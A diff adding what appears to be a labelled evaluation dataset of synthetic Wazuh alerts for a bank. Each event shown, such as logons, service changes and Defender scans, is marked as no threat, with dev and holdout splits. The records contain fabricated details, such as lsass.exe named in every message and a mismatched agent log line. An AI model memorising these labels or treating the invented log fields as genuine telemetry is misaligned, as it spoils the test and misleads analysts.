@@ -1,0 +1,3948 @@
+[
+ {
+  "source": "wazuh",
+  "client": "Sahyadri Co-operative Bank",
+  "raw": {
+   "timestamp": "2026-11-22T03:30:02.000+0000",
+   "rule": {
+    "level": 3,
+    "description": "Windows Logon Success",
+    "id": "60106",
+    "firedtimes": 1,
+    "mail": false,
+    "groups": [
+     "windows",
+     "windows_security",
+     "authentication_success"
+    ],
+    "mitre": {
+     "id": [
+      "T1078"
+     ],
+     "tactic": [
+      "Defense Evasion",
+      "Persistence",
+      "Privilege Escalation",
+      "Initial Access"
+     ],
+     "technique": [
+      "Valid Accounts"
+     ]
+    }
+   },
+   "agent": {
+    "id": "001",
+    "name": "SCB-BR2-WKS-014",
+    "ip": "10.20.4.37"
+   },
+   "manager": {
+    "name": "wazuh-server"
+   },
+   "id": "1763800000.0000001",
+   "location": "EventChannel",
+   "decoder": {
+    "name": "windows_eventchannel"
+   },
+   "data": {
+    "win": {
+     "system": {
+      "providerName": "Microsoft-Windows-Security-Auditing",
+      "eventID": "4624",
+      "channel": "Security",
+      "computer": "SCB-BR2-WKS-014",
+      "systemTime": "2026-11-22T03:30:02Z",
+      "severityValue": "INFORMATION",
+      "message": "\"Event recorded by Microsoft-Windows-Security-Auditing. Process Name: C:\\Windows\\System32\\lsass.exe\""
+     },
+     "eventdata": {
+      "subjectUserName": "SCB-BR2-WKS-014$",
+      "subjectDomainName": "SCB",
+      "targetUserName": "SYSTEM",
+      "targetDomainName": "NT AUTHORITY",
+      "logonType": "5",
+      "logonProcessName": "Advapi",
+      "ipAddress": "-",
+      "processName": "C:\\Windows\\System32\\services.exe"
+     }
+    }
+   }
+  },
+  "label": {
+   "threat": false,
+   "scenario": "routine",
+   "split": "dev",
+   "why": ""
+  }
+ },
+ {
+  "source": "wazuh",
+  "client": "Sahyadri Co-operative Bank",
+  "raw": {
+   "timestamp": "2026-11-22T03:30:09.000+0000",
+   "rule": {
+    "level": 3,
+    "description": "Windows Logon Success",
+    "id": "60106",
+    "firedtimes": 1,
+    "mail": false,
+    "groups": [
+     "windows",
+     "windows_security",
+     "authentication_success"
+    ],
+    "mitre": {
+     "id": [
+      "T1078"
+     ],
+     "tactic": [
+      "Defense Evasion",
+      "Persistence",
+      "Privilege Escalation",
+      "Initial Access"
+     ],
+     "technique": [
+      "Valid Accounts"
+     ]
+    }
+   },
+   "agent": {
+    "id": "001",
+    "name": "SCB-BR2-WKS-014",
+    "ip": "10.20.4.37"
+   },
+   "manager": {
+    "name": "wazuh-server"
+   },
+   "id": "1763800000.0000002",
+   "location": "EventChannel",
+   "decoder": {
+    "name": "windows_eventchannel"
+   },
+   "data": {
+    "win": {
+     "system": {
+      "providerName": "Microsoft-Windows-Security-Auditing",
+      "eventID": "4624",
+      "channel": "Security",
+      "computer": "SCB-BR2-WKS-014",
+      "systemTime": "2026-11-22T03:30:09Z",
+      "severityValue": "INFORMATION",
+      "message": "\"Event recorded by Microsoft-Windows-Security-Auditing. Process Name: C:\\Windows\\System32\\lsass.exe\""
+     },
+     "eventdata": {
+      "subjectUserName": "SCB-BR2-WKS-014$",
+      "subjectDomainName": "SCB",
+      "targetUserName": "SYSTEM",
+      "targetDomainName": "NT AUTHORITY",
+      "logonType": "5",
+      "logonProcessName": "Advapi",
+      "ipAddress": "-",
+      "processName": "C:\\Windows\\System32\\services.exe"
+     }
+    }
+   }
+  },
+  "label": {
+   "threat": false,
+   "scenario": "routine",
+   "split": "dev",
+   "why": ""
+  }
+ },
+ {
+  "source": "wazuh",
+  "client": "Sahyadri Co-operative Bank",
+  "raw": {
+   "timestamp": "2026-11-22T03:31:40.000+0000",
+   "rule": {
+    "level": 3,
+    "description": "Windows Logon Success",
+    "id": "60106",
+    "firedtimes": 1,
+    "mail": false,
+    "groups": [
+     "windows",
+     "windows_security",
+     "authentication_success"
+    ],
+    "mitre": {
+     "id": [
+      "T1078"
+     ],
+     "tactic": [
+      "Defense Evasion",
+      "Persistence",
+      "Privilege Escalation",
+      "Initial Access"
+     ],
+     "technique": [
+      "Valid Accounts"
+     ]
+    }
+   },
+   "agent": {
+    "id": "001",
+    "name": "SCB-BR2-WKS-014",
+    "ip": "10.20.4.37"
+   },
+   "manager": {
+    "name": "wazuh-server"
+   },
+   "id": "1763800000.0000003",
+   "location": "EventChannel",
+   "decoder": {
+    "name": "windows_eventchannel"
+   },
+   "data": {
+    "win": {
+     "system": {
+      "providerName": "Microsoft-Windows-Security-Auditing",
+      "eventID": "4624",
+      "channel": "Security",
+      "computer": "SCB-BR2-WKS-014",
+      "systemTime": "2026-11-22T03:31:40Z",
+      "severityValue": "INFORMATION",
+      "message": "\"Event recorded by Microsoft-Windows-Security-Auditing. Process Name: C:\\Windows\\System32\\lsass.exe\""
+     },
+     "eventdata": {
+      "subjectUserName": "SCB-BR2-WKS-014$",
+      "subjectDomainName": "SCB",
+      "targetUserName": "a.kulkarni",
+      "targetDomainName": "SCB",
+      "logonType": "2",
+      "logonProcessName": "Advapi",
+      "ipAddress": "-",
+      "processName": "C:\\Windows\\System32\\services.exe"
+     }
+    }
+   }
+  },
+  "label": {
+   "threat": false,
+   "scenario": "routine",
+   "split": "dev",
+   "why": ""
+  }
+ },
+ {
+  "source": "wazuh",
+  "client": "Sahyadri Co-operative Bank",
+  "raw": {
+   "timestamp": "2026-11-22T03:44:10.000+0000",
+   "rule": {
+    "level": 3,
+    "description": "Windows Logon Success",
+    "id": "60106",
+    "firedtimes": 1,
+    "mail": false,
+    "groups": [
+     "windows",
+     "windows_security",
+     "authentication_success"
+    ],
+    "mitre": {
+     "id": [
+      "T1078"
+     ],
+     "tactic": [
+      "Defense Evasion",
+      "Persistence",
+      "Privilege Escalation",
+      "Initial Access"
+     ],
+     "technique": [
+      "Valid Accounts"
+     ]
+    }
+   },
+   "agent": {
+    "id": "001",
+    "name": "SCB-BR2-WKS-014",
+    "ip": "10.20.4.37"
+   },
+   "manager": {
+    "name": "wazuh-server"
+   },
+   "id": "1763800000.0000004",
+   "location": "EventChannel",
+   "decoder": {
+    "name": "windows_eventchannel"
+   },
+   "data": {
+    "win": {
+     "system": {
+      "providerName": "Microsoft-Windows-Security-Auditing",
+      "eventID": "4624",
+      "channel": "Security",
+      "computer": "SCB-BR2-WKS-014",
+      "systemTime": "2026-11-22T03:44:10Z",
+      "severityValue": "INFORMATION",
+      "message": "\"Event recorded by Microsoft-Windows-Security-Auditing. Process Name: C:\\Windows\\System32\\lsass.exe\""
+     },
+     "eventdata": {
+      "subjectUserName": "SCB-BR2-WKS-014$",
+      "subjectDomainName": "SCB",
+      "targetUserName": "SYSTEM",
+      "targetDomainName": "NT AUTHORITY",
+      "logonType": "5",
+      "logonProcessName": "Advapi",
+      "ipAddress": "-",
+      "processName": "C:\\Windows\\System32\\services.exe"
+     }
+    }
+   }
+  },
+  "label": {
+   "threat": false,
+   "scenario": "routine",
+   "split": "holdout",
+   "why": ""
+  }
+ },
+ {
+  "source": "wazuh",
+  "client": "Sahyadri Co-operative Bank",
+  "raw": {
+   "timestamp": "2026-11-22T04:10:55.000+0000",
+   "rule": {
+    "level": 3,
+    "description": "Windows Logon Success",
+    "id": "60106",
+    "firedtimes": 1,
+    "mail": false,
+    "groups": [
+     "windows",
+     "windows_security",
+     "authentication_success"
+    ],
+    "mitre": {
+     "id": [
+      "T1078"
+     ],
+     "tactic": [
+      "Defense Evasion",
+      "Persistence",
+      "Privilege Escalation",
+      "Initial Access"
+     ],
+     "technique": [
+      "Valid Accounts"
+     ]
+    }
+   },
+   "agent": {
+    "id": "001",
+    "name": "SCB-BR2-WKS-014",
+    "ip": "10.20.4.37"
+   },
+   "manager": {
+    "name": "wazuh-server"
+   },
+   "id": "1763800000.0000005",
+   "location": "EventChannel",
+   "decoder": {
+    "name": "windows_eventchannel"
+   },
+   "data": {
+    "win": {
+     "system": {
+      "providerName": "Microsoft-Windows-Security-Auditing",
+      "eventID": "4624",
+      "channel": "Security",
+      "computer": "SCB-BR2-WKS-014",
+      "systemTime": "2026-11-22T04:10:55Z",
+      "severityValue": "INFORMATION",
+      "message": "\"Event recorded by Microsoft-Windows-Security-Auditing. Process Name: C:\\Windows\\System32\\lsass.exe\""
+     },
+     "eventdata": {
+      "subjectUserName": "SCB-BR2-WKS-014$",
+      "subjectDomainName": "SCB",
+      "targetUserName": "a.kulkarni",
+      "targetDomainName": "SCB",
+      "logonType": "11",
+      "logonProcessName": "Advapi",
+      "ipAddress": "-",
+      "processName": "C:\\Windows\\System32\\services.exe"
+     }
+    }
+   }
+  },
+  "label": {
+   "threat": false,
+   "scenario": "routine",
+   "split": "holdout",
+   "why": ""
+  }
+ },
+ {
+  "source": "wazuh",
+  "client": "Sahyadri Co-operative Bank",
+  "raw": {
+   "timestamp": "2026-11-22T03:31:41.000+0000",
+   "rule": {
+    "level": 3,
+    "description": "Windows Workstation Logon Success",
+    "id": "60118",
+    "firedtimes": 1,
+    "mail": false,
+    "groups": [
+     "windows",
+     "windows_security",
+     "authentication_success"
+    ],
+    "mitre": {
+     "id": [
+      "T1078"
+     ],
+     "tactic": [
+      "Defense Evasion",
+      "Persistence",
+      "Privilege Escalation",
+      "Initial Access"
+     ],
+     "technique": [
+      "Valid Accounts"
+     ]
+    }
+   },
+   "agent": {
+    "id": "001",
+    "name": "SCB-BR2-WKS-014",
+    "ip": "10.20.4.37"
+   },
+   "manager": {
+    "name": "wazuh-server"
+   },
+   "id": "1763800000.0000006",
+   "location": "EventChannel",
+   "decoder": {
+    "name": "windows_eventchannel"
+   },
+   "data": {
+    "win": {
+     "system": {
+      "providerName": "Microsoft-Windows-Security-Auditing",
+      "eventID": "4624",
+      "channel": "Security",
+      "computer": "SCB-BR2-WKS-014",
+      "systemTime": "2026-11-22T03:31:41Z",
+      "severityValue": "INFORMATION",
+      "message": "\"Event recorded by Microsoft-Windows-Security-Auditing. Process Name: C:\\Windows\\System32\\lsass.exe\""
+     },
+     "eventdata": {
+      "targetUserName": "a.kulkarni",
+      "targetDomainName": "SCB",
+      "logonType": "7",
+      "ipAddress": "127.0.0.1"
+     }
+    }
+   }
+  },
+  "label": {
+   "threat": false,
+   "scenario": "routine",
+   "split": "dev",
+   "why": ""
+  }
+ },
+ {
+  "source": "wazuh",
+  "client": "Sahyadri Co-operative Bank",
+  "raw": {
+   "timestamp": "2026-11-22T03:58:00.000+0000",
+   "rule": {
+    "level": 3,
+    "description": "Windows User Logoff",
+    "id": "60137",
+    "firedtimes": 1,
+    "mail": false,
+    "groups": [
+     "windows",
+     "windows_security"
+    ]
+   },
+   "agent": {
+    "id": "001",
+    "name": "SCB-BR2-WKS-014",
+    "ip": "10.20.4.37"
+   },
+   "manager": {
+    "name": "wazuh-server"
+   },
+   "id": "1763800000.0000007",
+   "location": "EventChannel",
+   "decoder": {
+    "name": "windows_eventchannel"
+   },
+   "data": {
+    "win": {
+     "system": {
+      "providerName": "Microsoft-Windows-Security-Auditing",
+      "eventID": "4634",
+      "channel": "Security",
+      "computer": "SCB-BR2-WKS-014",
+      "systemTime": "2026-11-22T03:58:00Z",
+      "severityValue": "INFORMATION",
+      "message": "\"Event recorded by Microsoft-Windows-Security-Auditing. Process Name: C:\\Windows\\System32\\lsass.exe\""
+     },
+     "eventdata": {
+      "targetUserName": "a.kulkarni",
+      "targetDomainName": "SCB",
+      "logonType": "2"
+     }
+    }
+   }
+  },
+  "label": {
+   "threat": false,
+   "scenario": "routine",
+   "split": "dev",
+   "why": ""
+  }
+ },
+ {
+  "source": "wazuh",
+  "client": "Sahyadri Co-operative Bank",
+  "raw": {
+   "timestamp": "2026-11-22T03:30:20.000+0000",
+   "rule": {
+    "level": 3,
+    "description": "Service startup type was changed",
+    "id": "61104",
+    "firedtimes": 1,
+    "mail": false,
+    "groups": [
+     "windows",
+     "windows_system",
+     "policy_changed"
+    ]
+   },
+   "agent": {
+    "id": "001",
+    "name": "SCB-BR2-WKS-014",
+    "ip": "10.20.4.37"
+   },
+   "manager": {
+    "name": "wazuh-server"
+   },
+   "id": "1763800000.0000008",
+   "location": "EventChannel",
+   "decoder": {
+    "name": "windows_eventchannel"
+   },
+   "data": {
+    "win": {
+     "system": {
+      "providerName": "Service Control Manager",
+      "eventID": "7040",
+      "channel": "System",
+      "computer": "SCB-BR2-WKS-014",
+      "systemTime": "2026-11-22T03:30:20Z",
+      "severityValue": "INFORMATION",
+      "message": "\"Event recorded by Service Control Manager. Process Name: C:\\Windows\\System32\\lsass.exe\""
+     },
+     "eventdata": {
+      "param1": "Background Intelligent Transfer Service",
+      "param2": "auto start",
+      "param3": "demand start"
+     }
+    }
+   }
+  },
+  "label": {
+   "threat": false,
+   "scenario": "routine",
+   "split": "dev",
+   "why": ""
+  }
+ },
+ {
+  "source": "wazuh",
+  "client": "Sahyadri Co-operative Bank",
+  "raw": {
+   "timestamp": "2026-11-22T03:30:21.000+0000",
+   "rule": {
+    "level": 3,
+    "description": "Service startup type was changed",
+    "id": "61104",
+    "firedtimes": 1,
+    "mail": false,
+    "groups": [
+     "windows",
+     "windows_system",
+     "policy_changed"
+    ]
+   },
+   "agent": {
+    "id": "001",
+    "name": "SCB-BR2-WKS-014",
+    "ip": "10.20.4.37"
+   },
+   "manager": {
+    "name": "wazuh-server"
+   },
+   "id": "1763800000.0000009",
+   "location": "EventChannel",
+   "decoder": {
+    "name": "windows_eventchannel"
+   },
+   "data": {
+    "win": {
+     "system": {
+      "providerName": "Service Control Manager",
+      "eventID": "7040",
+      "channel": "System",
+      "computer": "SCB-BR2-WKS-014",
+      "systemTime": "2026-11-22T03:30:21Z",
+      "severityValue": "INFORMATION",
+      "message": "\"Event recorded by Service Control Manager. Process Name: C:\\Windows\\System32\\lsass.exe\""
+     },
+     "eventdata": {
+      "param1": "Background Intelligent Transfer Service",
+      "param2": "auto start",
+      "param3": "demand start"
+     }
+    }
+   }
+  },
+  "label": {
+   "threat": false,
+   "scenario": "routine",
+   "split": "dev",
+   "why": ""
+  }
+ },
+ {
+  "source": "wazuh",
+  "client": "Sahyadri Co-operative Bank",
+  "raw": {
+   "timestamp": "2026-11-22T03:35:00.000+0000",
+   "rule": {
+    "level": 3,
+    "description": "Service startup type was changed",
+    "id": "61104",
+    "firedtimes": 1,
+    "mail": false,
+    "groups": [
+     "windows",
+     "windows_system",
+     "policy_changed"
+    ]
+   },
+   "agent": {
+    "id": "001",
+    "name": "SCB-BR2-WKS-014",
+    "ip": "10.20.4.37"
+   },
+   "manager": {
+    "name": "wazuh-server"
+   },
+   "id": "1763800000.0000010",
+   "location": "EventChannel",
+   "decoder": {
+    "name": "windows_eventchannel"
+   },
+   "data": {
+    "win": {
+     "system": {
+      "providerName": "Service Control Manager",
+      "eventID": "7040",
+      "channel": "System",
+      "computer": "SCB-BR2-WKS-014",
+      "systemTime": "2026-11-22T03:35:00Z",
+      "severityValue": "INFORMATION",
+      "message": "\"Event recorded by Service Control Manager. Process Name: C:\\Windows\\System32\\lsass.exe\""
+     },
+     "eventdata": {
+      "param1": "Background Intelligent Transfer Service",
+      "param2": "auto start",
+      "param3": "demand start"
+     }
+    }
+   }
+  },
+  "label": {
+   "threat": false,
+   "scenario": "routine",
+   "split": "holdout",
+   "why": ""
+  }
+ },
+ {
+  "source": "wazuh",
+  "client": "Sahyadri Co-operative Bank",
+  "raw": {
+   "timestamp": "2026-11-22T04:40:11.000+0000",
+   "rule": {
+    "level": 3,
+    "description": "Service startup type was changed",
+    "id": "61104",
+    "firedtimes": 1,
+    "mail": false,
+    "groups": [
+     "windows",
+     "windows_system",
+     "policy_changed"
+    ]
+   },
+   "agent": {
+    "id": "001",
+    "name": "SCB-BR2-WKS-014",
+    "ip": "10.20.4.37"
+   },
+   "manager": {
+    "name": "wazuh-server"
+   },
+   "id": "1763800000.0000011",
+   "location": "EventChannel",
+   "decoder": {
+    "name": "windows_eventchannel"
+   },
+   "data": {
+    "win": {
+     "system": {
+      "providerName": "Service Control Manager",
+      "eventID": "7040",
+      "channel": "System",
+      "computer": "SCB-BR2-WKS-014",
+      "systemTime": "2026-11-22T04:40:11Z",
+      "severityValue": "INFORMATION",
+      "message": "\"Event recorded by Service Control Manager. Process Name: C:\\Windows\\System32\\lsass.exe\""
+     },
+     "eventdata": {
+      "param1": "Background Intelligent Transfer Service",
+      "param2": "auto start",
+      "param3": "demand start"
+     }
+    }
+   }
+  },
+  "label": {
+   "threat": false,
+   "scenario": "routine",
+   "split": "holdout",
+   "why": ""
+  }
+ },
+ {
+  "source": "wazuh",
+  "client": "Sahyadri Co-operative Bank",
+  "raw": {
+   "timestamp": "2026-11-22T03:32:00.000+0000",
+   "rule": {
+    "level": 3,
+    "description": "Software protection service scheduled successfully.",
+    "id": "60642",
+    "firedtimes": 1,
+    "mail": false,
+    "groups": [
+     "windows",
+     "windows_application"
+    ]
+   },
+   "agent": {
+    "id": "001",
+    "name": "SCB-BR2-WKS-014",
+    "ip": "10.20.4.37"
+   },
+   "manager": {
+    "name": "wazuh-server"
+   },
+   "id": "1763800000.0000012",
+   "location": "EventChannel",
+   "decoder": {
+    "name": "windows_eventchannel"
+   },
+   "data": {
+    "win": {
+     "system": {
+      "providerName": "Microsoft-Windows-Security-SPP",
+      "eventID": "16384",
+      "channel": "Application",
+      "computer": "SCB-BR2-WKS-014",
+      "systemTime": "2026-11-22T03:32:00Z",
+      "severityValue": "INFORMATION",
+      "message": "\"Event recorded by Microsoft-Windows-Security-SPP. Process Name: C:\\Windows\\System32\\lsass.exe\""
+     },
+     "eventdata": {}
+    }
+   }
+  },
+  "label": {
+   "threat": false,
+   "scenario": "routine",
+   "split": "dev",
+   "why": ""
+  }
+ },
+ {
+  "source": "wazuh",
+  "client": "Sahyadri Co-operative Bank",
+  "raw": {
+   "timestamp": "2026-11-22T03:33:00.000+0000",
+   "rule": {
+    "level": 4,
+    "description": "Summary event of the report's signatures.",
+    "id": "60608",
+    "firedtimes": 1,
+    "mail": false,
+    "groups": [
+     "windows",
+     "windows_application"
+    ]
+   },
+   "agent": {
+    "id": "001",
+    "name": "SCB-BR2-WKS-014",
+    "ip": "10.20.4.37"
+   },
+   "manager": {
+    "name": "wazuh-server"
+   },
+   "id": "1763800000.0000013",
+   "location": "EventChannel",
+   "decoder": {
+    "name": "windows_eventchannel"
+   },
+   "data": {
+    "win": {
+     "system": {
+      "providerName": "Windows Error Reporting",
+      "eventID": "1001",
+      "channel": "Application",
+      "computer": "SCB-BR2-WKS-014",
+      "systemTime": "2026-11-22T03:33:00Z",
+      "severityValue": "INFORMATION",
+      "message": "\"Event recorded by Windows Error Reporting. Process Name: C:\\Windows\\System32\\lsass.exe\""
+     },
+     "eventdata": {}
+    }
+   }
+  },
+  "label": {
+   "threat": false,
+   "scenario": "routine",
+   "split": "holdout",
+   "why": ""
+  }
+ },
+ {
+  "source": "wazuh",
+  "client": "Sahyadri Co-operative Bank",
+  "raw": {
+   "timestamp": "2026-11-22T03:30:30.000+0000",
+   "rule": {
+    "level": 3,
+    "description": "The database engine is initiating recovery steps.",
+    "id": "60807",
+    "firedtimes": 1,
+    "mail": false,
+    "groups": [
+     "windows",
+     "windows_application"
+    ]
+   },
+   "agent": {
+    "id": "001",
+    "name": "SCB-BR2-WKS-014",
+    "ip": "10.20.4.37"
+   },
+   "manager": {
+    "name": "wazuh-server"
+   },
+   "id": "1763800000.0000014",
+   "location": "EventChannel",
+   "decoder": {
+    "name": "windows_eventchannel"
+   },
+   "data": {
+    "win": {
+     "system": {
+      "providerName": "ESENT",
+      "eventID": "300",
+      "channel": "Application",
+      "computer": "SCB-BR2-WKS-014",
+      "systemTime": "2026-11-22T03:30:30Z",
+      "severityValue": "INFORMATION",
+      "message": "\"Event recorded by ESENT. Process Name: C:\\Windows\\System32\\lsass.exe\""
+     },
+     "eventdata": {}
+    }
+   }
+  },
+  "label": {
+   "threat": false,
+   "scenario": "routine",
+   "split": "dev",
+   "why": "'recovery' here is a database replaying its log, not boot recovery being switched off"
+  }
+ },
+ {
+  "source": "wazuh",
+  "client": "Sahyadri Co-operative Bank",
+  "raw": {
+   "timestamp": "2026-11-22T04:00:00.000+0000",
+   "rule": {
+    "level": 3,
+    "description": "Windows Defender: Antimalware scan started",
+    "id": "62107",
+    "firedtimes": 1,
+    "mail": false,
+    "groups": [
+     "windows",
+     "windows_defender"
+    ]
+   },
+   "agent": {
+    "id": "001",
+    "name": "SCB-BR2-WKS-014",
+    "ip": "10.20.4.37"
+   },
+   "manager": {
+    "name": "wazuh-server"
+   },
+   "id": "1763800000.0000015",
+   "location": "EventChannel",
+   "decoder": {
+    "name": "windows_eventchannel"
+   },
+   "data": {
+    "win": {
+     "system": {
+      "providerName": "Microsoft-Windows-Windows Defender",
+      "eventID": "1000",
+      "channel": "Microsoft-Windows-Windows Defender/Operational",
+      "computer": "SCB-BR2-WKS-014",
+      "systemTime": "2026-11-22T04:00:00Z",
+      "severityValue": "INFORMATION",
+      "message": "\"Event recorded by Microsoft-Windows-Windows Defender. Process Name: C:\\Windows\\System32\\lsass.exe\""
+     },
+     "eventdata": {}
+    }
+   }
+  },
+  "label": {
+   "threat": false,
+   "scenario": "routine",
+   "split": "dev",
+   "why": "'Antimalware' must not match the word 'malware'"
+  }
+ },
+ {
+  "source": "wazuh",
+  "client": "Sahyadri Co-operative Bank",
+  "raw": {
+   "timestamp": "2026-11-22T04:05:00.000+0000",
+   "rule": {
+    "level": 3,
+    "description": "Windows Defender: Antimalware definitions updated successfully",
+    "id": "62130",
+    "firedtimes": 1,
+    "mail": false,
+    "groups": [
+     "windows",
+     "windows_defender"
+    ]
+   },
+   "agent": {
+    "id": "001",
+    "name": "SCB-BR2-WKS-014",
+    "ip": "10.20.4.37"
+   },
+   "manager": {
+    "name": "wazuh-server"
+   },
+   "id": "1763800000.0000016",
+   "location": "EventChannel",
+   "decoder": {
+    "name": "windows_eventchannel"
+   },
+   "data": {
+    "win": {
+     "system": {
+      "providerName": "Microsoft-Windows-Windows Defender",
+      "eventID": "2000",
+      "channel": "Microsoft-Windows-Windows Defender/Operational",
+      "computer": "SCB-BR2-WKS-014",
+      "systemTime": "2026-11-22T04:05:00Z",
+      "severityValue": "INFORMATION",
+      "message": "\"Event recorded by Microsoft-Windows-Windows Defender. Process Name: C:\\Windows\\System32\\lsass.exe\""
+     },
+     "eventdata": {}
+    }
+   }
+  },
+  "label": {
+   "threat": false,
+   "scenario": "routine",
+   "split": "holdout",
+   "why": ""
+  }
+ },
+ {
+  "source": "wazuh",
+  "client": "Sahyadri Co-operative Bank",
+  "raw": {
+   "timestamp": "2026-11-22T03:30:00.000+0000",
+   "rule": {
+    "level": 3,
+    "description": "Wazuh agent started.",
+    "id": "503",
+    "firedtimes": 1,
+    "mail": false,
+    "groups": [
+     "ossec"
+    ]
+   },
+   "agent": {
+    "id": "001",
+    "name": "SCB-BR2-WKS-014",
+    "ip": "10.20.4.37"
+   },
+   "manager": {
+    "name": "wazuh-server"
+   },
+   "id": "1763800000.0000017",
+   "location": "wazuh-agent",
+   "full_log": "ossec: Agent started: 'SCB-BR2-WKS-014->any'."
+  },
+  "label": {
+   "threat": false,
+   "scenario": "routine",
+   "split": "dev",
+   "why": ""
+  }
+ },
+ {
+  "source": "wazuh",
+  "client": "Sahyadri Co-operative Bank",
+  "raw": {
+   "timestamp": "2026-11-22T03:30:00.000+0000",
+   "rule": {
+    "level": 3,
+    "description": "Wazuh agent stopped.",
+    "id": "506",
+    "firedtimes": 1,
+    "mail": false,
+    "groups": [
+     "ossec"
+    ],
+    "mitre": {
+     "id": [
+      "T1562.001"
+     ],
+     "tactic": [
+      "Defense Evasion"
+     ],
+     "technique": [
+      "Disable or Modify Tools"
+     ]
+    }
+   },
+   "agent": {
+    "id": "001",
+    "name": "SCB-BR2-WKS-014",
+    "ip": "10.20.4.37"
+   },
+   "manager": {
+    "name": "wazuh-server"
+   },
+   "id": "1763800000.0000018",
+   "location": "wazuh-agent",
+   "full_log": "ossec: Agent started: 'SCB-BR2-WKS-014->any'."
+  },
+  "label": {
+   "threat": false,
+   "scenario": "routine",
+   "split": "dev",
+   "why": ""
+  }
+ },
+ {
+  "source": "wazuh",
+  "client": "Sahyadri Co-operative Bank",
+  "raw": {
+   "timestamp": "2026-11-22T03:40:00.000+0000",
+   "rule": {
+    "level": 5,
+    "description": "Registry Key Integrity Checksum Changed",
+    "id": "594",
+    "firedtimes": 1,
+    "mail": false,
+    "groups": [
+     "ossec",
+     "syscheck",
+     "syscheck_entry_modified",
+     "syscheck_registry"
+    ],
+    "mitre": {
+     "id": [
+      "T1565.001",
+      "T1112"
+     ],
+     "tactic": [
+      "Impact",
+      "Defense Evasion"
+     ],
+     "technique": [
+      "Stored Data Manipulation",
+      "Modify Registry"
+     ]
+    }
+   },
+   "agent": {
+    "id": "001",
+    "name": "SCB-BR2-WKS-014",
+    "ip": "10.20.4.37"
+   },
+   "manager": {
+    "name": "wazuh-server"
+   },
+   "id": "1763800000.0000019",
+   "location": "syscheck",
+   "decoder": {
+    "name": "syscheck_registry_value_set"
+   },
+   "syscheck": {
+    "path": "HKEY_LOCAL_MACHINE\\System\\CurrentControlSet\\Services\\BITS",
+    "event": "modified",
+    "mode": "scheduled",
+    "sha256_after": "2c26b46b68ffc68ff99b453c1d30413413422d706483bfa0f98a5e886266e7ae"
+   }
+  },
+  "label": {
+   "threat": false,
+   "scenario": "routine",
+   "split": "dev",
+   "why": ""
+  }
+ },
+ {
+  "source": "wazuh",
+  "client": "Sahyadri Co-operative Bank",
+  "raw": {
+   "timestamp": "2026-11-22T03:40:02.000+0000",
+   "rule": {
+    "level": 5,
+    "description": "File added to the system.",
+    "id": "554",
+    "firedtimes": 1,
+    "mail": false,
+    "groups": [
+     "ossec",
+     "syscheck",
+     "syscheck_entry_added",
+     "syscheck_file"
+    ]
+   },
+   "agent": {
+    "id": "001",
+    "name": "SCB-BR2-WKS-014",
+    "ip": "10.20.4.37"
+   },
+   "manager": {
+    "name": "wazuh-server"
+   },
+   "id": "1763800000.0000020",
+   "location": "syscheck",
+   "decoder": {
+    "name": "syscheck_integrity_changed"
+   },
+   "syscheck": {
+    "path": "c:\\programdata\\microsoft\\windows\\start menu\\programs\\teams.lnk",
+    "event": "added",
+    "mode": "scheduled",
+    "sha256_after": "2c26b46b68ffc68ff99b453c1d30413413422d706483bfa0f98a5e886266e7ae"
+   }
+  },
+  "label": {
+   "threat": false,
+   "scenario": "routine",
+   "split": "holdout",
+   "why": ""
+  }
+ },
+ {
+  "source": "wazuh",
+  "client": "Sahyadri Co-operative Bank",
+  "raw": {
+   "timestamp": "2026-11-22T03:36:00.000+0000",
+   "rule": {
+    "level": 9,
+    "description": "Windows application error event.",
+    "id": "60602",
+    "firedtimes": 1,
+    "mail": false,
+    "groups": [
+     "windows",
+     "windows_application",
+     "system_error"
+    ]
+   },
+   "agent": {
+    "id": "001",
+    "name": "SCB-BR2-WKS-014",
+    "ip": "10.20.4.37"
+   },
+   "manager": {
+    "name": "wazuh-server"
+   },
+   "id": "1763800000.0000021",
+   "location": "EventChannel",
+   "decoder": {
+    "name": "windows_eventchannel"
+   },
+   "data": {
+    "win": {
+     "system": {
+      "providerName": "Application Error",
+      "eventID": "1000",
+      "channel": "Application",
+      "computer": "SCB-BR2-WKS-014",
+      "systemTime": "2026-11-22T03:36:00Z",
+      "severityValue": "INFORMATION",
+      "message": "\"Event recorded by Application Error. Process Name: C:\\Windows\\System32\\lsass.exe\""
+     },
+     "eventdata": {}
+    }
+   }
+  },
+  "label": {
+   "threat": false,
+   "scenario": "health",
+   "split": "dev",
+   "why": ""
+  }
+ },
+ {
+  "source": "wazuh",
+  "client": "Sahyadri Co-operative Bank",
+  "raw": {
+   "timestamp": "2026-11-22T04:36:00.000+0000",
+   "rule": {
+    "level": 9,
+    "description": "Windows application error event.",
+    "id": "60602",
+    "firedtimes": 1,
+    "mail": false,
+    "groups": [
+     "windows",
+     "windows_application",
+     "system_error"
+    ]
+   },
+   "agent": {
+    "id": "001",
+    "name": "SCB-BR2-WKS-014",
+    "ip": "10.20.4.37"
+   },
+   "manager": {
+    "name": "wazuh-server"
+   },
+   "id": "1763800000.0000022",
+   "location": "EventChannel",
+   "decoder": {
+    "name": "windows_eventchannel"
+   },
+   "data": {
+    "win": {
+     "system": {
+      "providerName": "Application Hang",
+      "eventID": "1002",
+      "channel": "Application",
+      "computer": "SCB-BR2-WKS-014",
+      "systemTime": "2026-11-22T04:36:00Z",
+      "severityValue": "INFORMATION",
+      "message": "\"Event recorded by Application Hang. Process Name: C:\\Windows\\System32\\lsass.exe\""
+     },
+     "eventdata": {}
+    }
+   }
+  },
+  "label": {
+   "threat": false,
+   "scenario": "health",
+   "split": "holdout",
+   "why": ""
+  }
+ },
+ {
+  "source": "wazuh",
+  "client": "Sahyadri Co-operative Bank",
+  "raw": {
+   "timestamp": "2026-11-22T03:37:00.000+0000",
+   "rule": {
+    "level": 5,
+    "description": "Windows System error event",
+    "id": "61102",
+    "firedtimes": 1,
+    "mail": false,
+    "groups": [
+     "windows",
+     "windows_system",
+     "system_error"
+    ]
+   },
+   "agent": {
+    "id": "001",
+    "name": "SCB-BR2-WKS-014",
+    "ip": "10.20.4.37"
+   },
+   "manager": {
+    "name": "wazuh-server"
+   },
+   "id": "1763800000.0000023",
+   "location": "EventChannel",
+   "decoder": {
+    "name": "windows_eventchannel"
+   },
+   "data": {
+    "win": {
+     "system": {
+      "providerName": "DCOM",
+      "eventID": "10016",
+      "channel": "System",
+      "computer": "SCB-BR2-WKS-014",
+      "systemTime": "2026-11-22T03:37:00Z",
+      "severityValue": "INFORMATION",
+      "message": "\"Event recorded by DCOM. Process Name: C:\\Windows\\System32\\lsass.exe\""
+     },
+     "eventdata": {}
+    }
+   }
+  },
+  "label": {
